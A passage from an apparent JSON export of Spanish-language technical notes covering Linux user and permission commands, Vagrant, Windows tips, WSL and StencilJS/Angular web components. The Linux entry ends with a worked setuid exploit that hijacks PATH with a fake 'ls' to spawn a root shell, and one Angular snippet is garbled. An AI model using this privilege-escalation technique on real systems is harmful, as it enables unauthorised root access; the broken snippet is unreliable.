1000 grupo\r\n```\r\n\r\n### Mostrar grupos\r\n\r\nPara mostrar los grupos a los que pertenece un usuario se utiliza el comando **groups**.\r\n\r\n```sh\r\n# Mostrar los grupos de un usuario\r\ngroups usuario\r\nid usuario\r\n# Mostrar todos los grupos del sistema\r\ncat /etc/group\r\n```\r\n\r\n### Añadir a un grupo\r\n\r\nPara añadir un usuario a un grupo se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Añadir un usuario a un grupo\r\nsudo usermod -aG grupo usuario\r\n```\r\n\r\n### Cambiar grupo primario\r\n\r\nPara cambiar el grupo primario de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el grupo primario de un usuario\r\nsudo usermod -g grupo usuario\r\n```\r\n\r\n### Cambiar nombre\r\n\r\nPara cambiar el nombre de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el nombre de un usuario\r\nsudo usermod -l nuevo_usuario usuario\r\n```\r\n\r\n### Cambiar home\r\n\r\nPara cambiar el directorio de inicio de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el directorio de inicio de un usuario\r\nsudo usermod -d /nuevo/home usuario\r\n```\r\n\r\n### Cambiar el id\r\n\r\nPara cambiar el identificador de un usuario se utiliza el comando **usermod**.\r\n\r\n```sh\r\n# Cambiar el identificador de un usuario\r\nsudo usermod -u 1000 usuario\r\n```\r\n\r\n### Cambiar la contraseña\r\n\r\nPara cambiar la contraseña de un usuario se utiliza el comando **passwd**.\r\n\r\n```sh\r\n# Cambiar la contraseña de un usuario\r\nsudo passwd usuario\r\n```\r\n\r\n### Eliminar un grupo\r\n\r\nPara eliminar un grupo se utiliza el comando **groupdel**.\r\n\r\n```sh\r\n# Eliminar un grupo\r\nsudo groupdel grupo\r\n```\r\n\r\n### Eliminar un usuario\r\n\r\nPara eliminar un usuario se utiliza el comando **userdel**.\r\n\r\n```sh \r\n# Eliminar un usuario\r\nsudo userdel usuario\r\n```\r\n\r\n## Cambio de propietario y grupo\r\n\r\nEl comando **chown** (change owner) permite cambiar el propietario y el grupo de un archivo o directorio.\r\n\r\n```sh\r\n# Cambiar el propietario de un archivo\r\nsudo chown usuario archivo\r\n# Cambiar el grupo de un archivo\r\nsudo chown :grupo archivo\r\n# Cambiar el propietario y el grupo de un archivo\r\nsudo chown usuario:grupo archivo\r\n```\r\n\r\n### chgrp\r\n\r\nEl comando **chgrp** (change group) permite cambiar el grupo de un archivo o directorio.\r\n\r\n```sh\r\n# Cambiar el grupo de un archivo\r\nsudo chgrp grupo archivo\r\n```\r\n\r\n## Caso práctico: Explotando el bit setuid\r\n\r\nEl bit setuid permite que un archivo se ejecute con los permisos del propietario. En este caso práctico se explota el bit setuid para obtener una shell con privilegios de superusuario.\r\n\r\n1. Crear un archivo con un programa que cambie el UID a 0 y ejecute una shell.\r\n2. Compilar el archivo y establecer el bit setuid.\r\n3. Ejecutar el archivo para obtener una shell con privilegios de superusuario.\r\n4. Encontrar el archivo con bit setuid.\r\n5. Crear un ejecutable que se llame \"ls\" que abra una consola interactiva\r\n6. Agregar el ejecutable al PATH\r\n\r\n\r\n```sh\r\n# Crear un archivo con bit setuid\r\nvim exploit.c\r\n# Contenido del fichero\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n\r\nint main() {\r\n    setuid(0);\r\n    system(\"ls /home/user\");\r\n    return 0;\r\n}\r\n# Compilar el archivo\r\ngcc exploit.c -o exploit\r\n# Establecer el propietario y el grupo\r\nsudo chown root:root exploit\r\n# Establecer el bit setuid\r\nsudo chmod u+s exploit\r\n# Ejecutar el archivo\r\n./exploit\r\n# Encontrar archivos con bit setuid\r\nfind / -type f -perm -4001 2> /dev/null\r\n# Crear un ejecutable que abra una consola interactiva\r\nvim ls\r\n# Contenido del fichero\r\n#!/bin/bash\r\n/bin/bash -i\r\n# Damos permisos de ejecución\r\nchmod +x ls\r\n# Agregar al PATH\r\nexport PATH=/home/user:$PATH\r\n# Ejecutamos exploit con el usuario user\r\n./exploit\r\n```\r\n",
    "path": "/systems/linux/users_permissions"
  },
  {
    "id": 83,
    "title": "vagrant",
    "content": "\r\n> Aplicación para crear maquinas virtuales escrito en rubi.\r\n>\r\n> Funciona a base de boxes (SO)\r\n>\r\n> Boxes ya configurados: vagrantcloud\r\n>\r\n> Requiere adaptadores: virtualbox, vmware, etc.\r\n\r\n## Comandos\r\n\r\n- Iniciar un Vagrantfile\r\n\r\n  ```sh\r\n  vagrant init\r\n  vagrant up\r\n  ```\r\n\r\n- Mostrar la configuración de todas las máquinas virtuales\r\n\r\n  ```sh\r\n  vagrant global-status\r\n  ```\r\n\r\n- Destruir una máquina virtual\r\n\r\n  ```sh\r\n  vagrant destroy <ID>\r\n  ```\r\n\r\n- Mostrar las boxes cacheadas\r\n\r\n  ```sh\r\n  vagrant box list\r\n  ```\r\n\r\n## WSL\r\n\r\n```sh\r\nexport VAGRANT_WSL_ENABLE_WINDOWS_ACCESS=\"1\"\r\nexport PATH=\"$PATH:/mnt/c/Program Files/Oracle/VirtualBox\"\r\n```\r\n",
    "path": "/systems/Virtualización/vagrant"
  },
  {
    "id": 84,
    "title": "atajos",
    "content": "\r\n- Win + Flecha izquierda/derecha + arriba/abajo: Fijar la ventana en un lateral\r\n- Alt + Tab: Cambiar entre ventanas recientes\r\n- Win + Tab: Vista de tareas, se ven todas las ventanas abiertas\r\n- Win + C: haz que aparezca Cortana\r\n- Win + Ctrl + D: Crear escritorio virtual\r\n- Win + Ctrl + F4: Cerrar escritorio virtual activo\r\n- Win + Ctrl + Izquierda o Derecha: Navegar entre escritorios virtuales\r\n- Win + I: Ejecuta la configuración del sistema\r\n",
    "path": "/systems/Windows/atajos"
  },
  {
    "id": 85,
    "title": "eliminar-grub",
    "content": "\r\n1. ve a cmd con privilegios de administrador\r\n\r\n2. abre diskpart y escribe \"list disk\" y selecciona el disco donde instalaste el sistema operativo escribiendo \"sel disk x\" donde x es el numero del disco que viste\r\n\r\n3. escribe \"list vol\" y busca la particion de boot, generalmente es formato FAT32 y en la info aparece como system\r\n\r\n4. selecciona el volumen donde este el boot escribiendo \"sel vol x\" donde x es el numero de volumen que viste\r\n\r\n5. luego asignale una letra a ese volumen escribiendo \"assign letter=X\" donde x es la letra que le quieras asignar, luego escribes \"exit\" para salir de diskpart\r\n\r\n6. ahora en cmd nuevamente escribes \"cd /d X:\" o simplemente \"cd X:\" donde x es la letra que hayas escogido en el paso anterior\r\n\r\n7. escribe \"ls\", te mostrará una lista de las carpetas y archivos en ese volumen, deberian ser pocos\r\n\r\n8. escribe \"ls EFI\", dentro de esta carpeta está el grub, luego escribe \"cd EFI\"\r\n\r\n9. escribe \"rmdir/s PhoenixOS\" o simplemente \"rmdir PhoenixOS\" si estas en powershell. Luego escribe \"y\" cuando te salga una pregunta de confirmacion. Con eso deberias haber eliminado el boot de phoenix os\r\n",
    "path": "/systems/Windows/eliminar-grub"
  },
  {
    "id": 86,
    "title": "herramientas",
    "content": "\r\n- Utilidades de resolución de problemas\r\n  [https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)",
    "path": "/systems/Windows/herramientas"
  },
  {
    "id": 87,
    "title": "powershell",
    "content": "\r\n## Ejecutar comandos npm & angular/cli\r\n\r\nAbrir powershell con permisos de administrador\r\n\r\n```sh\r\nSet-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser\r\n```\r\n",
    "path": "/systems/Windows/powershell"
  },
  {
    "id": 88,
    "title": "wsl",
    "content": "\r\n## Controlar el uso de memoria con WSL 2\r\n\r\n1. Ir a C:\\users\\tu-usuario y crear un archivo .wslconfig\r\n\r\n```sh\r\n[wsl2]\r\nmemory=4GB # Limits VM memory in WSL 2 to 4 GB\r\nprocessors=4 # Makes the WSL 2 VM use two virtual processors\r\n```\r\n\r\n2. Reiniciar el servicio abriendo PowerShell como administrador\r\n\r\n```sh\r\nRestart-Service LxssManager\r\n```\r\n",
    "path": "/systems/Windows/wsl"
  },
  {
    "id": 89,
    "title": "example_stencil_angular",
    "content": "\r\nEl objetivo principal de StencilJS es proporcionar herramientas para crear bibliotecas de componentes. Utiliza TS, JSX y CSS, y permite crear componentes web compatibles con los estándares.\r\n\r\n## Beneficios\r\n\r\n- Estándares Web\r\n- Optimizaciones automáticas al construir\r\n- Amigable a futuros cambios\r\n- API simple\r\n- Características de marcos de trabajo durante el desarrollo\r\n- Soporte amplio de navegador\r\n\r\n## Ejemplo\r\n\r\n:::info Repositorio\r\n\r\nIncluye el proyecto de Stencil y dentro el proyecto de Angular (my-library-in-angular)\r\n\r\n[https://github.com/rubenfgr-doc/stencil-my-components-library](https://github.com/rubenfgr-doc/stencil-my-components-library)\r\n\r\n:::\r\n\r\n### Iniciar el proyecto (Component)\r\n\r\n- Nombre del proyecto: my-components-library\r\n\r\n```sh\r\nnpm init stencil\r\n```\r\n\r\n### Instalamos dependencias e iniciamos\r\n\r\n```sh\r\ncd my-components-library\r\n$ npm install\r\nnpm start\r\n```\r\n\r\n### Nos crea un componente por defecto en src/components/my-component.tsx que vamos a modificar\r\n\r\n> En src/index.html podemos ver como se está utilizando\r\n\r\n```js title=\"my-component.tsx\"\r\nimport { Component, Prop, h } from \"@stencil/core\";\r\nimport { format } from \"../../utils/utils\";\r\n\r\n@Component({\r\n  tag: \"my-component\",\r\n  styleUrl: \"my-component.css\",\r\n  shadow: true,\r\n})\r\nexport class MyComponent {\r\n  @Prop() first: string;\r\n  @Prop() middle: string;\r\n  @Prop() last: string;\r\n\r\n  private getText(): string {\r\n    return format(this.first, this.middle, this.last);\r\n  }\r\n\r\n  render() {\r\n    return <div>Hello, World! I'm {this.getText()}</div>;\r\n  }\r\n}\r\n```\r\n\r\n```html title=\"index.html\"\r\n<my-component\r\n  first=\"Stencil\"\r\n  middle=\"'Don't call me a framework'\"\r\n  last=\"JS\"\r\n></my-component>\r\n```\r\n\r\n### Decoradores\r\n\r\n- **@Component()** declares a new web component\r\n- **@Prop()** declara una propidad a exponer\r\n- **@State()** declara un estado interno\r\n- **@Watch()** declara un hook para comprobar cambios de estado en \"propiedades y estados\"\r\n- **@Element()** declara una referencia el elemento host (si el elemento es my-component, sería una referencia a este)\r\n- **@Method()** declara un método a exponer\r\n- **@Event()** declara un evento DOM a emitir (expone)\r\n- **@Listen()** escucha eventos del DOM\r\n\r\nVamos a modificar el componente que viene por defecto aplicando estos decoradores\r\n\r\n```js title=my-component.tsx\r\nimport { Component, Element, Event, EventEmitter, Listen, Method, Prop, State, Watch, h } from '@stencil/core';\r\nimport { format } from '../../utils/utils';\r\n\r\n@Component({\r\n  tag: 'my-component',\r\n  styleUrl: 'my-component.css',\r\n  shadow: true,\r\n})\r\nexport class MyComponent {\r\n  /**\r\n   * The first name\r\n   */\r\n  @Prop() first: string;\r\n\r\n  /**\r\n   * The middle name\r\n   */\r\n  @Prop() middle: string;\r\n\r\n  /**\r\n   * The last name\r\n   */\r\n  @Prop() last: string;\r\n\r\n  /**\r\n   * Esta propiedad no será expuesta y solo se utiliza internamente\r\n   */\r\n  @State() internal: string;\r\n\r\n  @Watch('first')\r\n  watchFirstHandler(newValue: boolean, oldValue: boolean) {\r\n    console.log('[my-component.tsx] @Prop() first, valor anterior: ', oldValue);\r\n    console.log('[my-component.tsx] @Prop() first, nuevo valor: ', newValue);\r\n  }\r\n\r\n  @Watch('internal')\r\n  watchInternalHandler(newValue: boolean, oldValue: boolean) {\r\n    console.log('[my-component.tsx] @State() internal, valor anterior: ', oldValue);\r\n    console.log('[my-component.tsx] @State() internal, nuevo valor: ', newValue);\r\n  }\r\n\r\n  @Element() hostEl: HTMLElement;\r\n\r\n  @Method()\r\n  async getMessage() {\r\n    return 'Hello from my-component exposed method';\r\n  }\r\n\r\n  @Event() onMessage: EventEmitter<string>;\r\n\r\n  @Listen('onMessage')\r\n  onMessageEventHandler(event: CustomEvent<string>) {\r\n    console.log('[my-component.tsx] Evento onMessage recibido, propiedad event.detail: ', event.detail);\r\n  }\r\n\r\n  constructor() {\r\n    console.log('[my-component.tsx] hostEl', this.hostEl);\r\n\r\n    let counter = 0;\r\n\r\n    setInterval(() => {\r\n      this.onMessage.emit('Mensage con contador: ' + counter);\r\n      counter++;\r\n    }, 2000);\r\n  }\r\n\r\n  private getText(): string {\r\n    return format(this.first, this.middle, this.last);\r\n  }\r\n\r\n  render() {\r\n    return <div>Hello, World! I'm {this.getText()}</div>;\r\n  }\r\n}\r\n\r\n```\r\n\r\n```html title=index.html\r\n<!DOCTYPE html>\r\n<html dir=\"ltr\" lang=\"en\">\r\n  <head>\r\n    <meta charset=\"utf-8\" />\r\n    <meta\r\n      name=\"viewport\"\r\n      content=\"width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0\"\r\n    />\r\n    <title>Stencil Component Starter</title>\r\n\r\n    <script type=\"module\" src=\"/build/my-components-library.esm.js\"></script>\r\n    <script nomodule src=\"/build/my-components-library.js\"></script>\r\n  </head>\r\n  <body>\r\n    <my-component\r\n      first=\"Stencil\"\r\n      last=\"'Don't call me a framework' JS\"\r\n    ></my-component>\r\n  </body>\r\n\r\n  <script>\r\n    (async () => {\r\n      await customElements.whenDefined(\"my-component\");\r\n      const myComponent = document.getElementsByTagName(\"my-component\")[0];\r\n      setTimeout(() => {\r\n        myComponent.first = \"RubenFGR\";\r\n        myComponent.internal = \"ESTO NO FUNCIONA YA QUE ES UN ESTADO INTERNO\";\r\n      }, 3000);\r\n      var exposedMethodValue = await myComponent.getMessage();\r\n      console.log(\r\n        \"[index.html] myComponent.getMessage(): \",\r\n        exposedMethodValue\r\n      );\r\n      myComponent.addEventListener(\"onMessage\", (event) => {\r\n        console.log(\r\n          '[index.html] Evento \"onMessage\" recibido, propiedad event.detail: ',\r\n          event.detail\r\n        );\r\n      });\r\n    })();\r\n  </script>\r\n</html>\r\n```\r\n\r\n### Ciclo de vida\r\n\r\n- **connectedCallback()** Cuando el componente se conecta al DOM (antes de ser cargado). Puede ser llamado varias veces.\r\n- **disconnectedCallback()** Cuando el componente se desconecta del DOM. Puede ser llamado varias veces.\r\n\r\n```js\r\nconst el = document.createElement(\"my-cmp\");\r\ndocument.body.appendChild(el);\r\n// connectedCallback() called\r\n// componentWillLoad() called (first time)\r\n\r\nel.remove();\r\n// disconnectedCallback()\r\n\r\ndocument.body.appendChild(el);\r\n// connectedCallback() called again, but `componentWillLoad()` is not.\r\n```\r\n\r\n- **componentWillLoad()** Cuando el componente es conectado al DOM por primera vez y áun no es renderizado. Solo se llama una vez, es un buen lugar para cargar los datos que van a ser renderizados\r\n- **componentDidLoad()** Cuando el componente se ha renderizado por primera vez\r\n- **componentShouldUpdate()** Cuando un @Prop o @State va a cambiar. Recibe 3 argumentos, antiguo valor, nuevo valor y el nombre de la propiedad o estado y retorna un boolean que indica si debe ser reenderizado o no.\r\n- **componentWillRender()** Llamado antes de reenderizar. Devuelve una promesa que permite esperar el nuevo renderizado.\r\n- **componentDidRender()** Llamado después de renderizado.\r\n- **componentWillUpdate()** Llamado cuando @Prop() o @State() han cambiado. No se ejecuta en el primer renderizado.\r\n- **componentDidUpdate()** Llamado justo cuando se actualiza el componente. No se ejecuta en el primer renderizado.\r\n\r\n```js title=\"my-component.tsx\"\r\nimport { Component, Element, Event, EventEmitter, Listen, Method, Prop, State, Watch, h } from '@stencil/core';\r\nimport { format } from '../../utils/utils';\r\n\r\n@Component({\r\n  tag: 'my-component',\r\n  styleUrl: 'my-component.css',\r\n  shadow: true,\r\n})\r\nexport class MyComponent {\r\n  /**\r\n   * The first name\r\n   */\r\n  @Prop() first: string;\r\n\r\n  /**\r\n   * The middle name\r\n   */\r\n  @Prop() middle: string;\r\n\r\n  /**\r\n   * The last name\r\n   */\r\n  @Prop() last: string;\r\n\r\n  /**\r\n   * Esta propiedad no será expuesta y solo se utiliza internamente\r\n   */\r\n  @State() internal: string;\r\n\r\n  @Watch('first')\r\n  watchFirstHandler(newValue: boolean, oldValue: boolean) {\r\n    console.log('[my-component.tsx] @Prop() first, valor anterior: ', oldValue);\r\n    console.log('[my-component.tsx] @Prop() first, nuevo valor: ', newValue);\r\n  }\r\n\r\n  @Watch('internal')\r\n  watchInternalHandler(newValue: boolean, oldValue: boolean) {\r\n    console.log('[my-component.tsx] @State() internal, valor anterior: ', oldValue);\r\n    console.log('[my-component.tsx] @State() internal, nuevo valor: ', newValue);\r\n  }\r\n\r\n  @Element() hostEl: HTMLElement;\r\n\r\n  @Method()\r\n  async getMessage() {\r\n    return 'Hello from my-component exposed method';\r\n  }\r\n\r\n  @Event() onMessage: EventEmitter<string>;\r\n\r\n  @Listen('onMessage')\r\n  onMessageEventHandler(event: CustomEvent<string>) {\r\n    console.log('[my-component.tsx] Evento onMessage recibido, propiedad event.detail: ', event.detail);\r\n  }\r\n\r\n  constructor() {\r\n    console.log('[my-component.tsx] hostEl', this.hostEl);\r\n\r\n    let counter = 0;\r\n\r\n    setTimeout(() => {\r\n      this.onMessage.emit('Mensage con contador: ' + counter);\r\n      counter++;\r\n    }, 3000);\r\n  }\r\n\r\n  connectedCallback() {\r\n    console.log('connectedCallback()');\r\n  }\r\n\r\n  disconnectedCallback() {\r\n    console.log('disconnectedCallback()');\r\n  }\r\n\r\n  componentWillLoad() {\r\n    console.log('componentWillLoad()');\r\n  }\r\n\r\n  componentDidLoad() {\r\n    console.log('componentDidLoad()');\r\n  }\r\n\r\n  componentShouldUpdate() {\r\n    console.log('componentShouldUpdate()');\r\n  }\r\n\r\n  componentWillRender() {\r\n    console.log('componentWillRender()');\r\n  }\r\n\r\n  componentDidRender() {\r\n    console.log('componentDidRender()');\r\n  }\r\n\r\n  componentWillUpdate() {\r\n    console.log('componentWillUpdate()');\r\n  }\r\n\r\n  componentDidUpdate() {\r\n    console.log('componentDidUpdate()');\r\n  }\r\n\r\n  private getText(): string {\r\n    return format(this.first, this.middle, this.last);\r\n  }\r\n\r\n  render() {\r\n    return <div>Hello, World! I'm {this.getText()}</div>;\r\n  }\r\n}\r\n\r\n```\r\n\r\n### Contruyendo la libreria\r\n\r\nTipos de salida:\r\n\r\n- dist-custom-elements. Permite exportar elementos personalizados individualmente dejando en el desarrollador la opción de configurar la carga perezosa, la construcción y el registro, ya sea a través de un framework o de forma nativa.\r\n- dist. Es la salida por defecto que exporta la libreria de componentes al completo incluyendo la carga perezosa de cada uno de ellos al utilizarlo, es decir, el componente se cargará cuando este dentro de la pantalla del usuario.\r\n- www. Orientado para aplicaciones web y páginas web. Puede tener el beneficio del prerenderizado y trabajadores de servicio (service workers). La trae activa por defecto y permite probar los componentes que vamos creando.\r\n\r\nLa configuración utilizada para el tutorial es la que viene por defecto que contiene los tres tipos:\r\n\r\n```js title=\"stencil.config.ts\"\r\nimport { Config } from \"@stencil/core\";\r\n\r\nexport const config: Config = {\r\n  namespace: \"my-components-library\",\r\n  outputTargets: [\r\n    {\r\n      type: \"dist\",\r\n      esmLoaderPath: \"../loader\",\r\n    },\r\n    {\r\n      type: \"dist-custom-elements\",\r\n    },\r\n    {\r\n      type: \"docs-readme\",\r\n    },\r\n    {\r\n      type: \"www\",\r\n      serviceWorker: null, // disable service workers\r\n    },\r\n  ],\r\n  testing: {\r\n    browserHeadless: \"new\",\r\n  },\r\n};\r\n```\r\n\r\nRealizamos la construcción con el siguiente comando:\r\n\r\n```sh\r\nnpm run build\r\n```\r\n\r\n## Probando nuestra librería en un proyecto de Angular\r\n\r\nPor defecto, en el proyecto de stencil, el packague.json ya está configurado para publicar nuestra libreria de forma local o en un registro de paquetes como npm.\r\n\r\nEn este tutorial lo vamos hacer de forma local con el comando \"link\"\r\n\r\n### Creando el proyecto de angular\r\n\r\n```sh\r\nng new my-library-in-angular\r\n```\r\n\r\n### Compartiendo la libreria en local con \"link\"\r\n\r\nEste comando se ejecuta en la raíz del proyecto de stencil, donde está el packague.json.\r\n\r\nEl nombre de la librería será el que tengamos puesto en la propiedad \"name\" del packague.json.\r\n\r\n```sh\r\nnpm link\r\n```\r\n\r\n### Vinculando la libreria en el proyecto de angular\r\n\r\n```sh\r\ncd my-library-in-angular\r\nnpm link my-components-library\r\n```\r\n\r\n### Modificamos algunos ficheros\r\n\r\nEn app.module.ts agregamos el schema CUSTOM_ELEMENTS_SCHEMA para permitir el uso de elementos personalizados en Angular.\r\n\r\n```js title=\"app.module.ts\"\r\nimport { CUSTOM_ELEMENTS_SCHEMA, NgModule } from \"@angular/core\";\r\nimport { BrowserModule } from \"@angular/platform-browser\";\r\n\r\nimport { AppComponent } from \"./app.component\";\r\n\r\n@NgModule({\r\n  declarations: [AppComponent],\r\n  imports: [BrowserModule],\r\n  providers: [],stencil\r\nexport class AppModule {}\r\n```\r\n\r\nEn main.ts definimos nuestros elementos personalizados a través de los métodos de ayuda que contiene stencil para facilitar el trabajo: defineCustomElements y applyPolyfills. Este último para compatibilidad con navegadores antigüos.\r\n\r\n```js title=\"main.ts\"\r\nimport { platformBrowserDynamic } from \"@angular/platform-browser-dynamic\";\r\n\r\nimport { AppModule } from \"./app/app.module\";\r\n\r\nimport {\r\n  defineCustomElements,\r\n  applyPolyfills,\r\n} from \"my-components-library/loader\";\r\n\r\nplatformBrowserDynamic()\r\n  .bootstrapModule(AppModule)\r\n  .catch((err) => console.error(err));\r\n\r\napplyPolyfills().then(() => defineCustomElements());\r\n```\r\n\r\nY por último, hacemos uso de nuestro componente en app.component.html\r\n\r\n```js title=\"app.component.html\"\r\n<h1>Probando nuestra libreria de stencil</h1>\r\n\r\n<body>\r\n  <my-component first=\"Stencil\" last=\"'Don't call me a framework' JS\"></my-component>\r\n</body>\r\n\r\n<script>\r\n  (async () => {\r\n    await customElements.whenDefined('my-component');\r\n    const myComponent = document.getElementsByTagName('my-component')[0];\r\n    setTimeout(() => {\r\n      myComponent.first = 'RubenFGR';\r\n      myComponent.internal = 'ESTO NO FUNCIONA YA QUE ES UN ESTADO INTERNO';\r\n    }, 3000);\r\n    var exposedMethodValue = await myComponent.getMessage();\r\n    console.log('[index.html] myComponent.getMessage(): ', exposedMethodValue);\r\n    myComponent.addEventListener('onMessage', event => {\r\n      console.log('[index.html] Evento \"onMessage\" recibido, propiedad event.detail: ', event.detail);\r\n    });\r\n  })();\r\n</script>\r\n```\r\n\r\n## Tipado\r\n\r\nStencil va preparado para el tipado con TS y por defecto cuando hacemos el \"build\" nos genera los tipos de nuestros ficheros en el directorio dist/types.\r\n\r\n:::info Nomenclatura de tipos\r\n\r\nHTML\\<NombreComponente\\>Element\r\n\r\nPor ejemplo, para nuestro componente, MyComponent seria:\r\n\r\nHTMLMyComponentElement\r\n\r\n:::\r\n",
    "path": "/webdev/web_components/example_stencil_angular"
  },
  {
    "id": 90,
    "title": "intro",
    "content": "\r\nLos componentes web son bloques de código que encapsulan la estructura interna de elementos HTML, incluyendo CSS y JavaScript, permitiendo así que el código se pueda volver a usar como se quiera en otras webs y aplicaciones\r\n\r\n:::tip ¡A TENER EN CUENTA!\r\nLa principal característica de los **Componentes Web** es la **REUTILIZACIÓN**.\r\n:::\r\n\r\nEstán formados por diferentes tecnologías:\r\n\r\n### Elementos personalizados\r\n\r\nPermiten definir elementos personalizados y su comportamiento. Se componen de un **nombre**, una **clase** y un **objecto opcional** con la propiedad extends (solo cuando vamos a extender un elemento integrado).\r\n\r\n**2 tipos:**\r\n\r\n- **Autónomos**. Son independientes y no heredan de elementos HTML estándar\r\n\r\n  - Definición: customElements.define(\"my-element\", MyElementClass);\r\n  - Uso JS: document.createElement(\"my-element\");\r\n  - Uso HTML: `<my-element>...</my-element>`\r\n\r\n- **Integrados personalizados**. Heredan de elementos HTML básicos.\r\n\r\n  - Definición: `customElements.define(\"my-element\", MyElementClass, { extends: \"p\" });`\r\n  - Uso JS: `document.createElement(\"p\", { is: \"my-element\" });`\r\n  - Uso HTML: `<p is=\"my-element\">...</p>`\r\n\r\n## DOM de sombra\r\n\r\nEl Shadow DOM crea un sub-árbol dentro del DOM principal. El Shadow DOM contiene nodos HTML, CSS y JS independientes, es decir, **permite la encapsulación de pequeñas partes del documento**.\r\n\r\n**3 conceptos principales:**\r\n\r\n- **Shadow host**: nodo del DOM principal donde se ancla el Shadow DOM\r\n- **Shadow root**: nodo raíz del Shadow Tree\r\n- **Shadow boundary**: límites entre el DOM Tree y DOM principal\r\n- **Shadow tree**: árbol DOM dentro del Shadow DOM\r\n\r\n## Plantillas HTML\r\n\r\nElementos `<template\\>` y `<slot\\>` que permite escribir plantillas que no se muestran en la página y que se pueden reutilizar tantas veces como se necesiten.\r\n\r\n**Características interesantes**\r\n\r\n- Si se agrega un estilo dentro del template tendrá el alcance únicamente para el fragmento de código que se crea al utilizarlo.\r\n- Si se utiliza un slot este se sobreescribe con la nueva definición, si no se utiliza, se usará el código del template por defecto.\r\n\r\n## Ejemplo completo\r\n\r\n:::tip Referencia\r\n\r\n[https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots)\r\n\r\n:::\r\n\r\n1. Creando una plantilla\r\n\r\n```html\r\n<template id=\"element-details-template\">\r\n  <style>\r\n    details {\r\n      font-family: \"Open Sans Light\", Helvetica, Arial;\r\n    }\r\n    .name {\r\n      font-weight: bold;\r\n      color: #217ac0;\r\n      font-size: 120%;\r\n    }\r\n    h4 {\r\n      margin: 10px 0 -8px 0;\r\n    }\r\n    h4 span {\r\n      background: #217ac0;\r\n      padding: 2px 6px 2px 6px;\r\n    }\r\n    h4 span {\r\n      border: 1px solid #cee9f9;\r\n      border-radius: 4px;\r\n    }\r\n    h4 span {\r\n      color: white;\r\n    }\r\n    .attributes {\r\n      margin-left: 22px;\r\n      font-size: 90%;\r\n    }\r\n    .attributes p {\r\n      margin-left: 16px;\r\n      font-style: italic;\r\n    }\r\n  </style>\r\n  <details>\r\n    <summary>\r\n      <span>\r\n        <code class=\"name\"\r\n          >&lt;<slot name=\"element-name\">NEED NAME</slot>&gt;</code\r\n        >\r\n        <span class=\"desc\"\r\n          ><slot name=\"description\">NEED DESCRIPTION</slot></span\r\n        >\r\n      </span>\r\n    </summary>\r\n    <div class=\"attributes\">\r\n      <h4><span>Attributes</span></h4>\r\n      <slot name=\"attributes\"><p>None</p></slot>\r\n    </div>\r\n  </details>\r\n  <hr />\r\n</template>\r\n```\r\n\r\n2. Creando el componente web\r\n\r\n```js\r\ncustomElements.define(\r\n  \"element-details\",\r\n  class extends HTMLElement {\r\n    constructor() {\r\n      super();\r\n      const template = document.getElementById(\r\n        \"element-details-template\"\r\n      ).content;\r\n      const shadowRoot = this.attachShadow({ mode: \"open\" });\r\n      shadowRoot.appendChild(template.cloneNode(true));\r\n    }\r\n  }\r\n);\r\n```\r\n\r\n3. Utilizando el componente web\r\n\r\n```html\r\n<element-details>\r\n  <span slot=\"element-name\">slot</span>\r\n  <span slot=\"description\"\r\n    >A placeholder inside a web componente that users can fill with their own\r\n    markup, with the effect of composing different DOM trees together.</span\r\n  >\r\n  <dl slot=\"attributes\">\r\n    <dt>name</dt>\r\n    <dd>The name of the slot.</dd>\r\n  </dl>\r\n</element-details>\r\n\r\n<element-details>\r\n  <span slot=\"element-name\">template</span>\r\n  <span slot=\"description\"\r\n    >A mechanism for holding client- side content that is not to be rendered\r\n    when a page is loaded but may subsequently be instantiated during runtime\r\n    using JavaScript.</span\r\n  >\r\n</element-details>\r\n```\r\n",
    "path": "/webdev/web_components/intro"
  },
  {
    "id": 91,
    "title": "referencia",
    "content": "\r\n## Ejemplos\r\n\r\n- [https://github.com/mdn/web-components-examples](https://github.com/mdn/web-components-examples)\r\n\r\n## Referencias\r\n\r\n- [https://developer.mozilla.org/en-US/docs/Web/API/Web_components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components)\r\n- [https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/web-components/](https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/web-components/)\r\n\r\n## Librerías\r\n\r\n- [StencilJS](https://stenciljs.com/)\r\n",
    "path": "/webdev/web_components/referencia"
  }
]